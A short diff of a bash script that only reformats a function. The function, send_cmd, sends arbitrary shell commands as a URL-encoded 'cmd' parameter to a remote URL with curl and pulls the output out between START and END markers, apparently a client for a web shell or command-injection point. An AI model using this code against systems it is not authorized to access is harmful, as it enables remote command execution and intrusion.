@@ -26,9 +26,12 @@ send_cmd() {
   local wrapped_cmd="echo START; $cmd; echo END"
   local out
   local tmp
-  tmp=$(mktemp) || { echo "[!] mktemp failed"; return 1; }
+  tmp=$(mktemp) || {
+    echo "[!] mktemp failed"
+    return 1
+  }
   # Use curl to send a GET request with the URL-encoded 'cmd' parameter
-  curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL" > "$tmp"
+  curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL" >"$tmp"
   out=$(tr -d '\000' <"$tmp")
   # Remove everything before the START marker
   out="${out#*START}"
